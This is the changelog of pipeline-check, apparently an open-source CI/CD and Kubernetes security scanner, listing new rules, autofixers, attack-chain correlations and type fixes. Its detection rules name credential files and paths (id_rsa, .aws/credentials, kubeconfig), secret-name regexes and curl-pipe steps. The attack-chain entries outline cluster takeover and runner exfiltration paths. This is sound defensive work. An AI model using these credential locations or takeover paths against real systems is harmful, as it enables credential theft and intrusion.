  server, etcd, and kubelet credentials. `kube-system` is exempt for
  both. Kubernetes rule catalog: 28 to 30.
- **Two more Dockerfile rules.** `DF-019` flags `COPY` / `ADD`
  whose source basename is a well-known credential file (`id_rsa`,
  `.npmrc`, `.netrc`, `.env`, `terraform.tfvars`, `kubeconfig`),
  whose path tail matches a canonical credential location
  (`.aws/credentials`, `.docker/config.json`, `.kube/config`,
  `.ssh/id_*`), or whose extension suggests private-key material
  (`.pem`, `.key`, `.p12`, `.pfx`, `.jks`). `DF-020` flags `ARG`
  declarations whose name matches the shared `secret_shapes`
  regex (`*TOKEN*`, `*SECRET*`, `*PASSWORD*`, `*API_KEY*`); `--build-arg`
  values land in `docker history` even when no default is set.
  Together they push build-time secrets toward
  `RUN --mount=type=secret`. Dockerfile rule catalog: 18 to 20.
- **Standards mapping backfill.** OWASP Top 10 CI/CD and NIST 800-53
  control mappings for `GCB-019`, `K8S-027`, `K8S-028`, `DF-017`,
  `DF-018` (which had been added to the rule registry but not the
  standards data files), plus mappings for the new `K8S-029`,
  `K8S-030`, `DF-019`, `DF-020`.
- GitHub issue templates under `.github/ISSUE_TEMPLATE/`: bug report,
  feature request, and a dedicated false-positive form that requires
  `check_id` plus a minimal repro YAML.
- **Per-rule unit tests at 100% across every provider.** Following the
  ``tests/<provider>/conftest.py`` + per-area-module pattern, every
  rule under ``github``, ``gitlab``, ``bitbucket``, ``azure``,
  ``circleci``, ``jenkins``, ``cloudbuild``, ``dockerfile``, and
  ``kubernetes`` now has at least one ``Test<RULE_ID>`` class with
  positive and negative cases. Test modules are split by area
  (pinning, secrets-and-creds, runtime-hardening, supply-chain,
  provenance, threats). Each conftest exposes a
  ``run_check(snippet, check_id)`` helper that runs the orchestrator
  against an inline YAML/Groovy snippet and returns the matching
  ``Finding``.
- **Performance smoke gate** under ``tests/perf/test_smoke.py``.
  Scans a synthetic 500-job GHA workflow and 500 K8s manifests with
  generously-padded ceilings (5s median over 3 runs). Catches
  catastrophic regressions (an O(n) rule that becomes O(n²), a
  per-step regex compile that should be module-level) without
  taking on a ``pytest-benchmark`` dependency. Real benchmark gate
  with baselines is still tracked on the roadmap.
- **Rule-coverage meta-test** at ``tests/test_rule_test_coverage.py``
  locks every provider's floor at 100% to prevent regressions: a new
  rule landing without a ``class Test<RULE_ID>...`` immediately
  trips this guard.
- **13 new autofixers** for Kubernetes and Cloud Build, lifting the
  catalog from 68 to 81. K8s: drop-line fixers for `K8S-002`/`-003`/
  `-004`/`-005` (`hostNetwork`, `hostPID`, `hostIPC`, `privileged:
  true`); flip-value fixers for `K8S-006`/`-007`/`-008` (flip
  `allowPrivilegeEscalation`, `runAsNonRoot`, `readOnlyRootFilesystem`
  to the safe value while preserving inline comments); comment-only
  TODOs for `K8S-013` (`hostPath` volumes) and `K8S-020`
  (`cluster-admin` / `system:masters` bindings). Cloud Build: insert
  top-level `timeout: '600s'` for `GCB-005`, drop `logging: NONE`
  for `GCB-014`, comment-only TODO above unpinned step images for
  `GCB-001`, plus shared TLS-bypass mitigation for `GCB-011`.
- **Six more autofixers** for the previously-empty Dockerfile
  catalog plus one Cloud Build addition, lifting the catalog from
  81 to 87. Comment-only TODO patterns: `DF-001` (pin base image
  by digest, multi-stage aware — only annotates unpinned FROM
  lines), `DF-002` (drop to non-root user before final CMD/
  ENTRYPOINT, skipped when a USER directive is already present),
  `DF-007` (add HEALTHCHECK, skipped when one exists), `DF-013`
  (drop EXPOSE 22), `DF-017` (drop world-writable prefix from PATH
  — mirrors the rule's prefix-vs-tail logic so it skips harmless
  `PATH=$PATH:/tmp` patterns), and `GCB-007` (pin Secret Manager
  version to `versions/<N>` rather than `versions/latest`).
  Dockerfile is no longer the only provider with zero fixers.
- **One more attack chain — Kubernetes cluster takeover.** `AC-011`
  fires when `K8S-013` (hostPath volume) AND `K8S-020` (cluster-admin
  ClusterRoleBinding) both fail in the same manifest set. Together
  those two settings give an attacker who lands code in any pod on a
  poisoned node both an escape to the host filesystem and the API
  privileges to pivot the entire cluster — read every Secret, deploy
  privileged DaemonSets across all nodes, impersonate any
  ServiceAccount. Severity CRITICAL, MITRE T1611 (Escape to Host) +
  T1098.003 + T1078. Chain catalog goes from 10 to 11.
- **Two new attack chains.** `AC-009` Supply Chain Repo Poisoning
  fires when GHA-001 (unpinned action), GHA-002 (script-injection
  sink), and GHA-008 (literal secrets in YAML) all hit the same
  workflow file. `AC-010` Self-Hosted Runner Environment Exfiltration
  fires when GHA-012 (non-ephemeral self-hosted runner) coincides
  with GHA-016 (curl-pipe) or GHA-019 (token persistence) on the
  same workflow. Both are CRITICAL, mapped to MITRE T1195.002 +
  T1078.004 + T1552.001 as appropriate. Chain catalog goes from 8
  to 10.
- **Four new Kubernetes rules.** `K8S-023` flags Namespaces missing a
  `pod-security.kubernetes.io/enforce` label set to baseline or
  restricted (kube-system, kube-public, kube-node-lease are exempt).
  `K8S-024` flags long-running containers without a livenessProbe
  or readinessProbe (Jobs and CronJobs are exempt because their
  lifecycle signal is completion, not health). `K8S-025` flags
  workloads outside `kube-system` that claim `system-cluster-critical`
  or `system-node-critical` priority — those classes give the right
  to evict every non-system pod on the cluster. `K8S-026` flags
  Services of type LoadBalancer that don't set
  `spec.loadBalancerSourceRanges`, which is the cloud-portable way
  to cap an external LB at known client CIDRs. K8s rule catalog
  goes from 22 to 26.
- **Two new Dockerfile rules.** `DF-015` flags `RUN` instructions
  that grant world-writable permissions (`chmod 777`, `chmod 0777`,
  `chmod a+w`, `chmod a+rwx`, `chmod ugo+w`). World-writable
  directories under `/` are an established container-escape vector.
  `DF-016` flags images that don't declare both
  `org.opencontainers.image.source` and
  `org.opencontainers.image.revision` LABELs. The two annotations
  are the de-facto OCI provenance standard; without them a pulled
  image can't be traced back to a source revision during incident
  response. Dockerfile rule catalog goes from 14 to 16.
- **Two more Kubernetes rules.** `K8S-027` flags Ingress objects with
  no `spec.tls` block (or an empty list). HTTP-only Ingress lets a
  network attacker downgrade the connection and read or rewrite
  request bodies — meaningful for any path carrying credentials,
  session cookies, or PII. `K8S-028` flags containers that declare
  `ports[*].hostPort`, which binds directly to the node IP and
  bypasses the cluster's Service / NetworkPolicy / kube-proxy
  layer. Kubernetes rule catalog: 26 to 28.
- **Two more Dockerfile rules.** `DF-017` flags `ENV PATH=` directives
  that prepend a world-writable prefix (`/tmp`, `/var/tmp`,
  `/dev/shm`, `/run/lock`) ahead of the existing `$PATH` reference.
  A writable PATH entry that comes before the system bins lets any
  process inside the container shadow `ls`, `apt-get`, `cat`, etc.
  by dropping a binary of the same name into the writable dir.
  `DF-018` flags `RUN chown` / `RUN chgrp` calls that rewrite
  ownership of a system path (`/etc`, `/usr`, `/sbin`, `/bin`,
  `/lib`, `/lib64`, `/boot`, `/root`). Dockerfile rule catalog:
  16 to 18.
- **One more Cloud Build rule.** `GCB-019` flags steps that combine
  a shell `entrypoint:` (`bash`, `sh`, `zsh`, etc.) with a
  user-substitution token (`$_FOO`) inside `args`. Distinct from
  `GCB-004`, which fires only when `options.dynamicSubstitutions:
  true` is set — `GCB-019` catches the substitution → shell
  evaluation surface even with the default substitution mode,
  because Cloud Build expands `$_USER_VAR` literally before the
  shell sees it. Cloud Build rule catalog: 18 to 19.
- **Three new Cloud Build rules.** `GCB-016` flags step `dir:`
  fields that traverse out of `/workspace` via `..` (path-escape
  into the builder image filesystem). `GCB-017` flags
  image-producing builds that don't set
  `options.requestedVerifyOption: VERIFIED`, which is how Cloud
  Build emits signed SLSA provenance attestations alongside the
  pushed image; aligns with SLSA Build Level 2. `GCB-018` flags
  the legacy KMS-encrypted top-level `secrets:` block in favor
  of `availableSecrets` + Secret Manager (which rotates without
  re-committing ciphertext and produces explicit audit-log
  entries on every read). Cloud Build rule catalog goes from 15
  to 18.

### Changed

- **Per-chain detail catalog in ``docs/attack_chains.md``.** The
  registered-chains table at the top now click-throughs to a
  card-style detail section per chain, generated by a new
  ``scripts/gen_attack_chains_doc.py`` from the live ``ChainRule``
  metadata. Each card carries a severity chip, MITRE ATT&CK
  technique pills (``T1611``, ``T1098.003``, etc.), kill-chain
  phase, summary prose, references, and a framed "Recommended
  action" block — same visual language as the per-rule cards in
  provider docs. ``tests/test_attack_chains_doc.py`` runs the
  generator in ``--check`` mode and fails CI if the on-disk doc
  drifts from the registry. Sentinel-bracketed
  (``<!-- chain-catalog:start -->`` / ``:end -->``) so the
  hand-written intro / output-format / gating sections of the
  page stay untouched on regeneration.
- **Autofix indicator on every provider doc.** The "What it covers"
  summary table grew a "Fix" column with a ``🔧 fix`` chip on rows
  whose check_id is in the registered ``_FIXERS`` registry; the
  per-rule chip row gains a ``🔧 autofix`` chip alongside severity
  / OWASP / ESF / CWE; the lead-in line under "What it covers"
  reads e.g. ``19 checks · 5 have an autofix patch (--fix)``.
  Generator imports ``_FIXERS`` from ``pipeline_check.core.autofix``
  and intersects with each rule. New ``.pg-fix`` CSS class — pill
  geometry matching ``.pg-tag``, teal accent, slate-mode variant.
  Sortable-tables JS treats empty cells as last, so sorting by Fix
  bubbles autofixable rules to the top.
- **Standards index shows live coverage counts.** Every card on
  ``docs/standards/index.md`` now displays "N controls · N checks
  evidenced" pulled live from the standard's mapping data via a
  new ``hooks/mkdocs_standards_stats.py`` MkDocs hook. The hook
  walks ``pipeline_check/core/standards/data/*.py`` via ``ast``,
  counts the keys in each ``STANDARD = Standard(...)`` call's
  ``mappings={...}`` and ``controls={...}`` kwargs, and substitutes
  ``{{ standards.<name>.checks }}`` / ``{{ standards.<name>.controls }}``
  tokens at build time. AST parsing (rather than importing the
  package) keeps the docs CI build self-contained — same pattern
  the existing version-templating hook uses. New
  ``tests/test_mkdocs_standards_stats_hook.py`` covers token
  substitution, unknown-name fallback, and no-token short-circuit.
- **Severity chips + linked check IDs in ``attack_chains.md``.** The
  registered-chains table now uses the same colored severity chips
  as the provider docs (CRITICAL rose, HIGH coral) and every
  triggering check ID is a click-through link to the corresponding
  provider rule. Cross-provider chains (AC-005, AC-007) link to
  the AWS provider page top since AWS rules are hand-authored
  without per-rule anchors.
- **Page-level metadata sweep in ``docs/_overrides/main.html``.**
  Mobile browser chrome ``theme-color`` is now scheme-aware
  (``#ffffff`` for light, ``#04101a`` matching ``--pg-navy-950``
  for dark) via ``prefers-color-scheme`` media queries.
  ``color-scheme`` switched from forced ``dark`` to ``light dark``.
  Added explicit ``meta name="description"`` (Material doesn't emit
  one by default) and ``og:image:alt`` / ``twitter:image:alt`` for
  accessibility on link unfurls.
- **Per-rule UI overhaul on every provider doc.** The summary table
  now uses color-coded severity chips (rose / coral / amber / teal /
  gray) so the eye can scan a 30-rule provider page by urgency. Each
  rule renders inside a card-shaped block with a severity-matching
  left rail; a chip row at the top carries the severity + OWASP /
  ESF / CWE pill tags; recommendations sit in a framed, teal-tinted
  "Recommended action" block separated from the body narrative.
  ``scripts/gen_provider_docs.py`` rewritten to emit the new
  structure; nine provider docs regenerated.
- **Standards docs link through to the matching rule.** All 882
  bare ``\`<PREFIX>-<N>\``` mentions across the seven mapping-
  carrying standards docs (``cis_aws_foundations``,
  ``cis_supply_chain``, ``nist_800_53``, ``nist_ssdf``,
  ``owasp_cicd_top_10``, ``pci_dss_v4``, ``slsa``) are now markdown
  links into the corresponding provider page. CI providers land on
  the per-rule pinned anchor; AWS / Terraform / CloudFormation
  prefixes (whose pages are hand-maintained without per-rule
  anchors) link to the page top. ``scripts/link_standards_check_ids.py``
  rewrote the existing docs; ``scripts/gen_standards_mappings.py``
  updated to emit the link form natively for future regenerations.
- **CIS AWS Foundations standard mappings densified.** Added
  `1.14` (key rotation), `3.2` (CloudTrail log file validation),
  `3.7` (CloudTrail logs encrypted with KMS) to the controls
  table. Mapped `IAM-007`, `KMS-001`, `KMS-002`, `CT-001..003`,
  `CWL-001..002`, and `ECR-007` into the appropriate CIS
  controls. The `cis_aws_foundations` mapping nearly doubled in
  scope.
- **NIST 800-53 standard mappings densified.** Added `AU-11`
  (Audit Record Retention) to the controls table. Added
  mappings for the previously-uncovered Cloud Build (GCB-001
  through GCB-018), Kubernetes (K8S-001 through K8S-026),
  Dockerfile (DF-001 through DF-016), Jenkins (selected JF-*),
  and the missing AWS services (KMS, CT, CWL, CW, SM, SSM,
  SIGN, LMB, EB, CCM, CA). The `nist_800_53` mapping size grew
  from ~150 lines to ~250.
- OWASP CI/CD Top 10 mappings extended for new GCB-010..018,
  K8S-023..026, and the previously-unmapped Dockerfile rules
  (DF-001..016) so the cross-standards integrity check passes.
- `docs/index.md` wordmark and the inline terminal animation now
  read the version from `pipeline_check.__version__` via a mkdocs
  hook (`hooks/mkdocs_version.py`). The hardcoded `v0.3.0` and
  `v0.3.3` literals had drifted across release cycles.

### Fixed

- Reporter and gate function signatures (`report_terminal`,
  `report_json`, `report_html`, `report_sarif`, `report_junit`,
  `report_markdown`, `evaluate_gate`) now accept the actual
  `ScoreResult` `TypedDict` from `core.scorer` instead of an
  unparameterized `dict`. Closes a real type-inference gap that
  mypy was flagging in `cli.py` lines 1517–1617 and unblocks part
  of the eventual strict-mode flip.
- `GCB-018` rule narrowing: replaced the boolean-flag pattern with
  direct `isinstance(legacy, list) and legacy` so mypy narrows
  `legacy` to a list before iteration. The runtime behavior is
  unchanged; the type checker now agrees with the code.
- `cli.py` `--explain-chain` and `--standard-report` paths used
  variable names that collided with outer-scope loop variables
  of incompatible types. Renamed locally so mypy can narrow them
  cleanly without changing user-visible behavior.
- **mypy lax-mode is now clean** (80 errors -> 0). Closed the
  remaining ~50 real type bugs across `_secrets.py` (label reuse
  widening), `_iam_policy.py` (json.loads narrowing), gl004 (bool
  cast), cloudformation/services.py (env_vars annotation),
  autofix.py:1398 (regex slice), cloudformation/s3.py:_target_key
  (Ref/GetAtt narrowing), terraform/phase3.py (nested branches
  narrowing), lambda_handler (s3_key widening),
  providers/aws.py (s3 client narrowing), iam007_key_age
  (isinstance(datetime)), aws/_catalog.py (result tuple type),
  github/base.py (YAML 1.1 ``on``->``True`` cast),
  cloudformation/base.py (is_intrinsic + Sub return-type narrowing),
  jenkins/rules/_helpers.py (Match[str] generic).
- yaml-stub spam silenced via `disable_error_code = ["import-untyped"]`
  in `pyproject.toml` plus `types-PyYAML` added to `requirements-dev.in`
  (next pip-compile cycle will lock it in).
- AWS-leaning modules covered by a per-module mypy override
  (boto3's untyped responses produce ~22 near-identical errors;
  the documented escape hatch until `boto3-stubs` is adopted).
- **`continue-on-error: true` removed from `.github/workflows/python-app.yml`.**
  mypy is now a required CI gate. Strict mode (`strict = true`)
  remains a follow-up PR (~400 strict-only errors across rule
  modules).
- **CI lint-and-test resilience under newer mypy.** The unpinned
  `pip install mypy` step started pulling a release that's stricter
  on `Any | None` arguments and unused override-ignore comments.
  `parse_uses` widened from `str` to `Any` (it already does its own
  `isinstance(value, str)` check, and callers fish `uses` out of
  YAML mappings whose static type is `Any | None`).
  `pipeline_check.core.checks._yaml_lines` added to the existing
  `disallow_subclassing_any = false` override block alongside the
  other PyYAML SafeLoader subclasses; the now-redundant
  `# type: ignore[override]` markers on `construct_mapping` /
  `construct_sequence` and on `providers.github.post_filter` were
  dropped. `line_of_item` / `col_of_item` narrow with
  `isinstance(seq, LineList)` so the return type matches the
  declared `int | None`. `frozenset()` initializer in
  `github/resolver.py` got an explicit `frozenset[str]` annotation.
- **Helm version-probe timeout raised from 10s to 30s.** Cold runs
  on Windows CI runners spent most of the previous budget in
  Defender scanning `helm.exe` before the process could start. 30s
  is a comfortable ceiling without letting truly hung calls drag
  CI out.

## [0.3.3] - 2026-05-06

### Changed

- **GitHub Actions workflow audit.** `pypi-publish.yml` was duplicating
  `release.yml`'s tag-push behavior without the version-vs-wheel
  guard, which is the failure mode that produced the v0.3.1 mess.
  Auto-trigger removed; it stays as a manual-only fallback path with
  its own pyproject-version check. `docs.yml` and `pypi-publish.yml`
  checkout steps now set `persist-credentials: false` (GHA-002).
  `localstack-test.yml` pins LocalStack Pro to `:3` instead of
  `:latest` so a major-version bump can't surprise CI.
- README now uses `pipeline_check` long_description's logo URL pinned
  to the absolute `raw.githubusercontent.com` path. The relative
  `docs/logo.png` no longer rendered on PyPI after MANIFEST.in
  pruned `docs/` from the sdist.

### Fixed

- Removed dead-code import block in `tests/test_doc_claims.py`
  (`_count_awslike_checks` was never called and the imports were
  flagged by ruff F401 in CI on Windows).

## [0.3.2] - 2026-05-06

0.3.1 was tagged but the version-vs-tag guard caught that the bump
commit hadn't been merged. Re-cut as 0.3.2 with the bump on master.

### Added

- **Kubernetes manifest provider.** Parses K8s API documents
  (`Deployment`, `Pod`, `Job`, `CronJob`, `DaemonSet`, `StatefulSet`,
  `ReplicaSet`, `Service`, `Secret`, `Role`, `ClusterRole`,
  `RoleBinding`, `ClusterRoleBinding`) from YAML on disk. Multi-doc
  files and directories of manifests both work. Helm `values.yaml`,
  `Chart.yaml`, and kustomization files are silently skipped. New
  CLI flag `--k8s-path`, auto-detection of `kubernetes/`, `k8s/`,
  or `manifests/` at cwd. 22 checks (`K8S-001`..`K8S-022`) covering:
  image digest pinning, host-namespace sharing
  (`hostNetwork`/`hostPID`/`hostIPC`), `securityContext`
  (`privileged`, `allowPrivilegeEscalation`, `runAsNonRoot`,
  `readOnlyRootFilesystem`, capabilities, seccompProfile),
  service-account hygiene, `automountServiceAccountToken`,
  `hostPath` volumes (with a sensitive-path upgrade to CRITICAL for
  `docker.sock`, `/var/lib/kubelet`, `/etc`, `/`), resource limits,
  env-var and Secret credential leakage (with base64-decoded scans
  of `Secret.data`), default-namespace placement,
  ClusterRoleBinding to `cluster-admin` or `system:masters`,
  wildcard verbs+resources in Roles/ClusterRoles, and Services
  exposing port 22 (SSH).
- **Standards coverage for Kubernetes.** Every `K8S-*` rule is
  mapped into OWASP Top 10 CI/CD and NIST SP 800-190 (Application
  Container Security).
- **MANIFEST.in.** Defense-in-depth filter on the PyPI sdist to keep
  the GitHub Pages docs site, repo tooling, and local cache
  artifacts out of releases. Ships `CHANGELOG.md` (was previously
  absent from the sdist).
- **`tests/test_doc_claims.py`.** Locks the README and
  `docs/index.md` numerical claims (providers, standards,
  autofixers, attack chains, total checks) against the live
  registries so doc drift fails CI.
- **`tests/test_english_variant.py`.** Fails the suite if a British
  spelling lands in any tracked source or doc file. Convention
  documented in `CLAUDE.md`.

### Changed

- `pyproject.toml` description now lists every supported provider.
  CloudFormation, CircleCI, Cloud Build, and Dockerfile were
  previously omitted.
- README provider table, architecture ASCII, rule-tree listing, and
  the docs site landing page reconciled against the current rule
  catalog: 430+ checks across 12 providers. Older claims of "330+
  across 10/11" replaced.
- README logo points at the absolute GitHub raw URL so the PyPI
  long_description renders the image. The relative `docs/logo.png`
  path no longer resolved on PyPI after the sdist filter pruned
  `docs/`.
- Project switched to American English throughout. Convention
  documented in `CLAUDE.md`; bulk converter lives at
  `scripts/_apply_american_english.py`; enforcement via
  `tests/test_english_variant.py`.

### Fixed

- Config file loader (`core/config._TOPLEVEL_KEYS`) now accepts
  `cloudbuild_path`, `dockerfile_path`, `cfn_template`,
  `jenkinsfile_path`, and `k8s_path`. These keys were already
  documented by `pipeline_check init`'s scaffolded template but were
  silently rejected by the strict schema validator.

## [0.3.0] - 2026-05-05

### Added

- **Documentation site** — full MkDocs Material build deployed to
  GitHub Pages on every push to `master`. Hand-tuned landing page
  with an interactive scan-pipeline component, animated terminal,
  and brand-tinted typography across the provider, standards, and
  reference docs.
- **AWS IAM permissions reference** in `docs/providers/aws.md` —
  per-service permission map plus a copy-paste least-privilege
  IAM policy for running a full live-AWS scan, including a sample
  GitHub Actions OIDC trust policy.

### Changed

- Pinned `pymdown-extensions` to `10.21.2` to fix a fenced-code
  rendering bug present in 10.12 that mangled the language tag.
- GitHub Actions in `.github/workflows/docs.yml` are now pinned to
  commit SHAs (resolved from current major-version tags).
- `LocalStack Integration Test` workflow is now manual-trigger only
  (`workflow_dispatch`); push and nightly schedule triggers removed.

### Internal

- Dependabot kept dependencies and action SHAs current across the
  release window.

## [0.2.1] - 2026-04-20

### Added

- **Attack chains engine** — new `pipeline_check.core.chains` module with
  eight rules (`AC-001`..`AC-008`) that correlate individual findings into
  higher-signal attack paths (fork-PR credential theft, injection to
  unprotected deploy, unpinned action to credentials, self-hosted runner
  foothold, unsigned artifact to prod, cache poisoning, IAM privesc via
  CodeBuild, dependency confusion window).
- **Google Cloud Build expansion** — six additional checks (`GCB-010`..
  `GCB-015`) covering remote-script execution, TLS bypass, literal secrets,
  package source integrity, logging-disabled, and SBOM generation.
- **SARIF reporter** (`--output sarif`) — emits SARIF 2.1.0 for GitHub
  Code Scanning and other SARIF-aware tools.
- **`pipeline_check init`** — scaffolds a starter `.pipeline-check.yml`
  config with sensible defaults.
- **CodeQL workflow** and CI badges in the README.

### Changed

- `core/checks/base.py` refactored into smaller modules (`blob.py`,
  `tokens.py`, `_primitives/`) to reduce duplication across providers.
- `release.yml` now verifies the tag matches the built wheel version
  before uploading artifacts, failing early on version drift.

## [0.2.0] - 2026-04-17

First public release. Expands provider and standard coverage, adds two new
reporters, and hardens the HTML output for use in PR review workflows.

### Added

- **Google Cloud Build provider** — parses `cloudbuild.yaml`; ships 9 checks
  (`GCB-001`..`GCB-009`) covering step image pinning, secret handling, and
  substitution-variable injection.
- **Jenkins provider** — parses Declarative and Scripted `Jenkinsfile`s;
  ships 31 checks (`JF-001`..`JF-031`).
- **Terraform shift-left** — runs AWS-parity checks against
  `terraform show -json` plans before provisioning.
- **CloudFormation shift-left** — ~63 AWS-parity checks against YAML/JSON
  templates with `!Ref` / `!Sub` / `!GetAtt` intrinsic handling.
- **JUnit XML reporter** (`--output junit`) — groups findings into one
  `<testsuite>` per rule prefix so Jenkins / GitLab / Azure / CircleCI /
  GitHub Actions render them as native test rows.
- **Markdown reporter** (`--output markdown`) — GFM-compatible output for
  `$GITHUB_STEP_SUMMARY` and PR / MR comment bots. Failures table + passing
  checks collapsed in `<details>`.
- **Compliance standards** expanded from 3 to 13, including SLSA Build
  Track 1.0, NIST SSDF v1.1, NIST SP 800-53 Rev. 5, CIS Software Supply
  Chain 1.0, CIS AWS Foundations 3.0.0, PCI DSS v4.0, and NSA/CISA ESF
  Supply Chain.
- **`--standard-report`** CLI flag emits the control-to-check matrix for a
  standard, including gaps (controls with no mapped checks).
- **`--inventory`** / `--inventory-type` / `--inventory-only` — emit a
  scanned-component inventory alongside (or instead of) findings for
  asset-register and drift-detection use cases.
- **HTML reporter interactivity** — sticky filter bar, filter state
  round-tripped via URL query params, deep-link anchors with flash
  highlight, expand/collapse-all buttons, print stylesheet, keyboard
  shortcuts (`/` focuses filter, `Escape` clears it), and OS-aware theme
  toggle persisted to `localStorage`.
- **Provider HTML filter map** now covers every rule family
  (`GCB`, `CFN`, `SIGN`, `LMB`, `CA`, `CCM`, `CWL`, `KMS`, `SSM`, `EB`, …)
  so new checks don't silently collapse into an "other" bucket.
- **LocalStack integration test** pinned to 3.8 with a Terraform fixture,
  exercised in CI.
- **Dogfooding workflow** runs `pipeline_check` against its own
  `.github/workflows/` on every push.

### Changed

- **Rule counts** grew across every CI provider — GHA 27→29, GL 25→30,
  BB 25→27, ADO 26→28, JF 29→31, CC 26→30; AWS total 70→72.
- **SARIF reporter** now splits standard slugs into rule-level
  `properties.tags` (for GitHub code-scanning filters) and individual
  control IDs into per-result `properties.controls` (structured). This
  keeps rule tags under GitHub's 20-tag cap and lets kebab-case IDs
  (`Dangerous-Workflow`) round-trip cleanly.
- **CLI help text** uses ASCII fallbacks (`->`, `>=`) instead of `→` / `≥`
  so Windows `cmd.exe` (cp1252) can render `--help` without
  `UnicodeEncodeError`.

### Fixed

- **CLI stdio on Windows** — stdout / stderr are reconfigured with
  `errors="replace"` at import time so un-encodable characters degrade to
  `?` instead of crashing the process on legacy consoles.
- **HTML reporter** provider-prefix map no longer drops `GCB`, `CFN`,
  `SIGN`, `LMB`, `CA`, `CCM`, `CWL`, `KMS`, `SSM`, `EB`, `CW` — previously
  these collapsed to "other" and were unreachable from the Provider
  filter.

[0.2.0]: https://github.com/dmartinochoa/pipeline-check/releases/tag/v0.2.0
